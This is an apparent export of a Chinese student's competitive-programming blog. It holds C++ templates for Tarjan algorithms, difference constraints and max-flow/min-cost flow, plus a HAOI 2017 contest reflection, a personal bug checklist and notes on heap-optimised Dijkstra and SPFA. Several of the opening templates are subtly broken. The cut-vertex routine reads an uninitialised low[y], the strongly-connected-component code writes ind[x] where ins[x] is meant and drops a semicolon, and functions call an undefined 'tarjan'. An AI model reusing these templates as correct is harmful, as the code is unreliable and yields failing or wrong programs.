<h1 id="Tarjan-Point"><a href="#Tarjan-Point" class="headerlink" title="Tarjan_Point:"></a>Tarjan_Point:</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dfn[max],low[max],ind=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!dfn[i]) Tarjan(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan_Point</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> father=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[x]=low[y]=++ind;</span><br><span class="line">    <span class="keyword">int</span> son=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i!=<span class="number">0</span>;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>((y=a[i].Point)!=father)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            tarjan(y,x);</span><br><span class="line">            low[x]=min(low[y],low[x]);</span><br><span class="line">            <span class="keyword">if</span>(dfn[x]&lt;=low[y]) son++;                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> low[x]=min(low[x],dfn[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(son&gt;=<span class="number">2</span>||(son==<span class="number">1</span>&amp;&amp;father)) ans[++tot]=x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Tarjan-Line"><a href="#Tarjan-Line" class="headerlink" title="Tarjan_Line:"></a>Tarjan_Line:</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan_line</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> father=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[x]=low[x]=++ind;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i;i=a[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> y=a[i].Point;</span><br><span class="line">        <span class="keyword">if</span>(i!=father)</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            tarjan(y,i);</span><br><span class="line">            low[x]=min(low[x],low[y]);</span><br><span class="line">        &#125; <span class="keyword">else</span> low[x]=min(low[x],dfn[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[x]==low[x])</span><br><span class="line">    ans[++tot]=father;<span class="comment">//记录的是父亲边（也就是到达点x的边）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Tarjan-Connected-Component"><a href="#Tarjan-Connected-Component" class="headerlink" title="Tarjan_Connected_Component:"></a>Tarjan_Connected_Component:</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求强连通分量</span></span><br><span class="line"><span class="keyword">int</span> ind=<span class="number">0</span>,dfn[<span class="number">2000</span>],low[<span class="number">2000</span>],<span class="built_in">stack</span>[<span class="number">2000</span>],tot=<span class="number">0</span>,top=<span class="number">0</span></span><br><span class="line"><span class="keyword">bool</span> ins[<span class="number">2000</span>]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan_Strongly_Connected_Component</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[x]=low[x]=++ind;</span><br><span class="line">    ind[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">stack</span>[++top]=x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i;i=a[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> y=a[i].Point;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[y])</span><br><span class="line">        &#123;</span><br><span class="line">            tarjan(y);</span><br><span class="line">            low[x]=min(low[x],low[y]);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ins[y]==<span class="literal">true</span>)</span><br><span class="line">        low[x]=min(low[x],dfn[y]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dfn[x]==low[x])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k; tot++;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            k=<span class="built_in">stack</span>[top--];</span><br><span class="line">            ins[k]=<span class="literal">false</span>;</span><br><span class="line">            bel[k]=tot;</span><br><span class="line">        &#125;<span class="keyword">while</span>(k!=x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="差分约束："><a href="#差分约束：" class="headerlink" title="差分约束："></a>差分约束：</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Topsort_SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!dis[i]) Queue[++tail]=i;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=a[i].Point; dis[This]--;</span><br><span class="line">        Money[This]=max(Money[This],Money[Queue[head]]+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(!dis[This]) Queue[++tail]=This;</span><br><span class="line">        <span class="keyword">if</span>(dis[This]&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(Money+<span class="number">1</span>,Money+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(Money[<span class="number">1</span>]&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="FORD-FULKERSON算法"><a href="#FORD-FULKERSON算法" class="headerlink" title="FORD-FULKERSON算法"></a>FORD-FULKERSON算法</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Line)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==n)</span><br><span class="line">    &#123;</span><br><span class="line">        Get=<span class="literal">true</span>;</span><br><span class="line">        all+=Line;</span><br><span class="line">        Forward=Line;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(dis[x][i]&gt;<span class="number">0</span>&amp;&amp;!vis[i])</span><br><span class="line">    &#123;</span><br><span class="line">        DFS(i,min(dis[x][i],Line));</span><br><span class="line">        <span class="keyword">if</span>(Get)</span><br><span class="line">        &#123;</span><br><span class="line">            dis[x][i]-=Forward;</span><br><span class="line">            dis[i][x]+=Forward;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(Get)</span><br><span class="line">&#123;</span><br><span class="line">    Get=<span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    DFS(<span class="number">1</span>,<span class="number">123456789</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Dinic算法"><a href="#Dinic算法" class="headerlink" title="Dinic算法"></a>Dinic算法</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">        &#123;</span><br><span class="line">            Queue[++tail]=a[i].Point;</span><br><span class="line">            Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[n]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==n) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,D=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(a[i].Value&amp;&amp;Level[a[i].Point]==Level[x]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(D=GetMaxFlow(a[i].Point,min(Flow-MaxFlow,a[i].Value)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=D;</span><br><span class="line">        a[i].Value-=D;</span><br><span class="line">        a[a[i].Back].Value+=D;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">123456789</span>)) all+=ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="SPFA求最小费用最大流"><a href="#SPFA求最小费用最大流" class="headerlink" title="SPFA求最小费用最大流"></a>SPFA求最小费用最大流</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">12</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    dis[<span class="number">1</span>]=<span class="number">0</span>; vis[<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Top=Queue[head];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Top];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(a[i].Flow&amp;&amp;(dis[Top]+a[i].Value&lt;dis[a[i].Point]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">            &#123;</span><br><span class="line">                Queue[++tail]=a[i].Point;</span><br><span class="line">                vis[a[i].Point]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dis[a[i].Point]=dis[Top]+a[i].Value;</span><br><span class="line">            LastPoint[a[i].Point]=Top;</span><br><span class="line">            LastEdge[a[i].Point]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        vis[Top]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[T]!=<span class="number">202116108</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Find=<span class="number">123456789</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=T;i!=S;i=LastPoint[i])</span><br><span class="line">    <span class="keyword">if</span>(a[LastEdge[i]].Flow&lt;Find)</span><br><span class="line">    Find=a[LastEdge[i]].Flow;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=T;i!=S;i=LastPoint[i])</span><br><span class="line">    &#123;</span><br><span class="line">        a[LastEdge[i]].Flow-=Find;</span><br><span class="line">        a[a[LastEdge[i]].Back].Flow+=Find;</span><br><span class="line">        ans+=Find*(-a[LastEdge[i]].Value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>图论</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>HAOI 2017 总结</title>
    <url>/2017/05/20/18d8bfda0c51/</url>
    <content><![CDATA[<h1 id="HAOI"><a href="#HAOI" class="headerlink" title="HAOI"></a>HAOI</h1><h2 id="说在前面："><a href="#说在前面：" class="headerlink" title="说在前面："></a>说在前面：</h2><blockquote>
<p>昨天，2017/4/23，HAOI2017正式完结。</p>
</blockquote>
<p>首先这次考试也让我再次看清楚了自己，再次看清楚了OI。</p>
<p>学OI就是在赌博，这句话在省选体现的淋淋尽致。</p>
<p>我开始有些迷茫了……</p>
<h2 id="比赛经历："><a href="#比赛经历：" class="headerlink" title="比赛经历："></a>比赛经历：</h2><p>上午走到考试机房，的确有些累了，然后开始看题，第一题60分看起来很可行，直接上爆搜，但是实际上敲了100多行，自己构出来的几组数据都是可以过去的，当数据范围扩大到100度的时候就超时了……最后只拿到了10分。</p>
<p>然后其他两道题就输出了样例和while(true) cout&lt;&lt;“sro_centry_orz”&lt;&lt;endl;</p>
<p>下午懵逼一样的爬回去机房考试，看看题两道看起来都是可行的题目，但是老师定义了xor运算为and运算，当时我还没有学位运算，所以就傻不拉几的用起来了xor运算来计算，然后就没有然后了，明明看出来是个DP了啊……</p>
<p>第二题是一道字符串的题目，我想都没想直接开始暴力模拟，几重循环直接往上面开始套，结果只过了一个点。</p>
<p>这次考试总得来说就是拿稳暴力就是胜利，因为大家都在敲暴力（lzx等大佬除外）谁拿的暴力越稳，分数就自然越高。</p>
<p>这次一共20分，由于NOIP是在惨的可怜，第一页都没有进。</p>
<h2 id="比赛感受"><a href="#比赛感受" class="headerlink" title="比赛感受"></a>比赛感受</h2><p>这次机房成绩很不确定，因为这次考试的数据实际上是有问题的，所以说今天早上刘老师已经去郑州监督从新测评了，可怜Cdcq和Cydiater两位大神因为进队希望不大回去学了文化课……</p>
<p>不过虽然希望渺茫，但是还是希望两位大神在重新测评的时候进入省队的……</p>
<p>毕竟努力了这么久，与NOI擦肩而过绝对不是什么好受的事情，从Cdcq考完之后的心情也能看出来，明年，有了三分之一的名额限制，相比还会更加残酷。</p>
<p>机房高一也有考的比较高的人，都是各种分数都拿的很稳的，暴力出奇迹……看来刷题量并不能代表一切，能力才是最重要的，比如刷题量并不是最高但是每次稳拿全省第一的lzx。syq学长NOIP翻车成200多分，和前几名400+的差了将近一半，自称四人组最弱，但是坚持到了现在，省选大翻身，稳进省队……而且这也启示我就算希望渺茫，就算自己败得一塌糊涂，也要坚持到最后，说不定下一次考试就翻身了呢。</p>
<p>紫萱学姐的 “我不棒棒谁棒棒” 理论可能不太适合我这种弱要死的人，我一直是没有这种气魄的，我觉得我和syq很像，无论是从哪一方面（但毕竟人家是进队爷）。所以老老实实的慢慢提高能力，一次一次积累经验，向着HAOI努力吧。</p>
<p>首先就从代码能力上面开始提高自己吧，至少可以大大减少自己Debug的时间。然后就是各种模板，和参加各种比赛，我其实并不差，从最开始学竞赛学的几乎想放弃，两次考试加起来不到100分，P1005卡了我一下午，前两个月刷题量一直是倒数第一，到现在已经能不再落后，甚至追上别人。我很庆幸我没有放弃走这条路，虽然很残酷，但是至少我愿意……</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><blockquote>
<p>明年就轮到我们了，我们也是高一眼里的高二了，马上就放暑假，7月份又要来许多可爱的高一萌新。而我要开始不得不面对新的一轮NOIP和HAOI了，自己能走多远就走多远吧，就算失败了也没关系，竭尽全力就好！</p>
</blockquote>
]]></content>
      <categories>
        <category>阶段性总结</category>
      </categories>
      <tags>
        <tag>HAOI</tag>
        <tag>总结</tag>
        <tag>感想</tag>
      </tags>
  </entry>
  <entry>
    <title>你的bug！</title>
    <url>/2017/05/20/ab0363382f47/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>写下来自己犯下的所有错误，以便以后减少程序Debug的时间……</p>
<ol>
<li><p>邻接表存储的时候存下的是和这个点相邻的边，并不是一条连通的路。</p>
</li>
<li><p>用邻接表下标 i 做为其他的数组下标操作。</p>
</li>
<li><p>堆的比较方式是相反的。</p>
</li>
<li><p>第二重循环要用j ，并且千万记得不要出现声明 j却变成 i++：</p>
</li>
<li><p>在用memset的时候，头文件#include<cstring>一定要加上。</p>
</li>
<li><p>用完文件输入输出，在OJ上提交程序的时候要注释掉文件输入输出。</p>
</li>
<li><p>在使用getchar()读入的时候记得将下面开启同步语句关闭：</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<ol start="8">
<li><p>当在递归重新声明一个数组变量的时候，数组变量不会清空，而会是你上次记录的值，需要重新归零（其实是地址还没有变化QAQ）。</p>
</li>
<li><p>递归传递数组（只在数组上面发现了）的值的时候，一旦改变，那么再返回到上一层的时候，上一层的值也会是改变的，所以最好的方法就是再次在递归当层进行声明一个数组，然后对这个数组进行赋值操作。或者是在开一维数组，把全部的都记录下来！</p>
</li>
<li><p>string类型的处理速度非常慢非常慢，如果遇到了需要用string处理，而且数据量是比较大的，那么我们就直接使用字符数组char[]，这样无论是空间还是时间，性价比都是很高的。</p>
</li>
<li><p>在进行求联通分量的时候，需要访问每一个元素，因为图有可能不是联通的！</p>
</li>
<li><p>使用快读的时候，一定要记得返回读入；</p>
</li>
<li><p>写线段树的时候记得判断Left和Right的范围要重点检查！</p>
</li>
<li><p>树状数组读入的时候一定要记得坐标+1（不能有零）</p>
</li>
<li><p>在写线段树的时候，在改变值的时候a[Root]是根据外面要求修改的值去更新的，而不是Lazy标记。</p>
</li>
<li><p>线段树更新的时候，如果有多个变量（+ - * / &amp; ^ % | &lt;&lt; &gt;&gt;）的时候，如果更新懒标记和a[Root]的值，其他的懒标记也需要进行相应的计算。</p>
</li>
<li><p>线段树懒标记在下传的时候是根据Root的值去更新Root<em>2和Root</em>2+1的，尤其是a[Root<em>2]和a[Root</em>2+1]的懒标记里面的值已经在之前更新过自己了，所以说在传递的时候是由新增加的Root的懒标记去更新的！</p>
</li>
<li><p>在使用if语句的时候记得两个等号。</p>
</li>
<li><p>在函数里面声明变量是需要附上初值的，不然为随机数 <del>（应该是）</del></p>
</li>
<li><p>在套用模板的时候，记得检查所有的东西是否符合模板的计算要求，比如边界值，变量名称等等！</p>
</li>
<li><p>在存入图的边的时候，题目里面很有可能有重边。</p>
</li>
<li><p>在费用流的时候，建图一定要记得在费用是一个正的一个负的。</p>
</li>
<li><p>网络流一定要首先静态检查一遍，然后再打表建图，然后再次检查模板。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra堆优化+SPFA判断负环+如何卡掉SPFA  </title>
    <url>/2017/05/20/6db101601323/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>Dijkstra的堆优化真的是不好写，首先图里面一直犯的错误又来了，访问其他点直接上邻接表的下标i，求如何提高智商？在线等，急！</p>
</blockquote>
<p>以后所有的题目都无脑Dijkstra了，SPFA会被不良出题老师卡掉，Dijkstra需要记住一个东西，在堆里面的比较方式是相反的！greater是小根堆，“ &lt; ”是大根堆比较，“ &gt; ”是小根堆比较。被坑了，不过还好长了长记性……</p>
<p>Dijkstra的堆优化首先需要开一个结构体，然后定义比较方式，然后将初始点加入堆中，然后使用while循环，结束循环的条件就是当堆里面为空的时候。读堆顶，出堆，判断这个堆顶元素是否以前出过堆，如果出过就continue把，没出过就标记为出过。然后利用这个堆顶去更新和他相连的所有点，将没有出过堆的元素的加入堆中。不断的重复上面的过程直到退出。</p>
<p>大致过程就是这样，主要要使用邻接表，不然就是负优化的说，而且一个元素是会多次进堆的（因为大小被修改了QAQ），所以如果能直接修改堆中元素的值相比速度会提高很多，以后敲代码，如果是稠密图并且时间够，就直接上Dijkstra+堆优化，如果是稀疏图，时间不是太多，直接SPFA，其实SPFA性价比最高，但是担心被卡，还有稠密图表现也不是太好……总之努力提高代码能力，以后据情况来选择算法QAQ</p>
<p>NOIP级别的比赛直接上SPFA吧，想必出题老师也不会卡数据的……</p>
<h1 id="堆优化代码："><a href="#堆优化代码：" class="headerlink" title="堆优化代码："></a>堆优化代码：</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> Point)</span><span class="comment">//经过堆优化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int</span> ID;</span><br><span class="line">        <span class="keyword">int</span> Value;</span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (note x,note y)</span><br><span class="line">        &#123; <span class="keyword">return</span> x.Value&gt;y.Value; &#125;</span><br><span class="line">    &#125;f[<span class="number">501</span>],This;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int</span> Point;</span><br><span class="line">        <span class="keyword">int</span> Next;</span><br><span class="line">        <span class="keyword">int</span> Value;</span><br><span class="line">    &#125;a[<span class="number">10000</span>];</span><br><span class="line">    <span class="built_in">priority_queue</span>&lt;note&gt;Q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f[i].Value=<span class="number">123456789</span>;</span><br><span class="line">        f[i].ID=i;</span><br><span class="line">    &#125;</span><br><span class="line">    f[Point].Value=<span class="number">0</span>;</span><br><span class="line">    Q.push(f[Point]);</span><br><span class="line">    <span class="keyword">while</span>(Q.empty()==<span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=Q.top(); Q.pop();</span><br><span class="line">        <span class="keyword">if</span>(List[This.ID]) <span class="keyword">continue</span>;</span><br><span class="line">        List[This.ID]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[This.ID];i!=<span class="number">0</span>;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(!List[a[i].Point]&amp;&amp;This.Value+a[i].Value&lt;f[a[i].Point].Value)</span><br><span class="line">        &#123;</span><br><span class="line">            f[a[i].Point].Value=This.Value+a[i].Value;</span><br><span class="line">            Q.push(f[a[i].Point]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="SPFA判断负环"><a href="#SPFA判断负环" class="headerlink" title="SPFA判断负环"></a>SPFA判断负环</h1><blockquote>
<p>SPFA这种神奇的东西，可以判断负环的，首先我们只需要记录下来SPFA在运行的时候一个点进队的次数，如果这个点能够不停地更新，更新的次数如果大于n的时候，那么这里一定是存在负权回路的！</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">(<span class="keyword">int</span> Point)</span><span class="comment">//在NOIP级别比赛就用这个了</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">10</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    head=<span class="number">1</span>;tail=<span class="number">1</span>;dis[Point]=<span class="number">0</span>;</span><br><span class="line">    vis[Point]=<span class="literal">true</span>;Queue[<span class="number">1</span>]=Point;</span><br><span class="line">    all[Point]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=Queue[head++];</span><br><span class="line">        vis[This]=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[This];i!=<span class="number">0</span>;i=a[i].next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> That=a[i].Point;</span><br><span class="line">            <span class="keyword">if</span>(dis[This]+a[i].Value&lt;dis[That])</span><br><span class="line">            &#123;</span><br><span class="line">                dis[That]=dis[This]+a[i].Value;</span><br><span class="line">                <span class="keyword">if</span>(vis[That]==<span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Queue[++tail]=That;</span><br><span class="line">                    vis[That]=<span class="literal">true</span>;</span><br><span class="line">                    all[That]++;</span><br><span class="line">                    <span class="keyword">if</span>(all[That]&gt;n)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//有负环</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//没有负环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="卡SPFA"><a href="#卡SPFA" class="headerlink" title="卡SPFA"></a>卡SPFA</h1><p>SPFA这个算法是非常不稳定的，期望复杂度为O(K*E)，K是期望数字，E是边数（所以说稀疏图上啊！）</p>
<p>理论上SPFA可以被卡O(N<em>E)级别，对比稠密图简直要GG，但是如果按照平均复杂度来说的话，大概期望的是O(2</em>E)的吧，所以说以后低端局直接上SPFA，高端局如果图比较稠密就选择堆优化的Dijkstra……</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><blockquote>
<p>今天晚上去郑州，明天省选，希望考砸，为明年NOIP攒下坚实的RP！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>SPFA</tag>
        <tag>图论</tag>
        <tag>Dijkstra</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树的遍历和重建</title>
    <url>/2017/05/20/ff8c61f82606/</url>
    <content><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><blockquote>
<p>由于开始做一道DP题需要树形DP的知识点，于是就去学树形DP，但是学树形DP的时候需要用到树的知识点，然后就去学树，学树的重建的时候发现自己不会三种遍历，然后就去学三种遍历QAQ，然后花了一个上午看懂了……（果然没人讲效率低啊QAQ）</p>
</blockquote>
